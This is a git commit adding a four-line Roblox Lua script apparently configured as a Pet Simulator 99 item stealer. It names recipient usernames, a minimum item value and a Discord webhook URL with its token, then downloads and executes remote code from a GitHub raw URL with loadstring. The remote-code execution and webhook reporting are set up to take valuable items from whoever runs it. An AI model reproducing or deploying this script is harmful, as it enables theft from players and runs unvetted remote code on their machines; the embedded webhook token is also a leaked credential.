cdf89ee53f9ba7d4e4c58c9ecef272452e22b3fa
MaysonMargiela <maysonmargiela1@gmail.com>
2025-06-25 02:03:59 -0400

    Create source.lua

---
+++ source.lua
@@ -0,0 +1,4 @@
+Username = {"SpinnaMikee","Funnehfan6410"} 
+Webhook= "https://discord.com/api/webhooks/1386089464429809764/6_aaCeSPi17aYIZkU4roF154uSMpK6oLUoWK2xt1bj0BSljNu4JedEIO_12Crup5EJGg" 
+min_rap = 10000 --for pets go and pet simulator 99 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
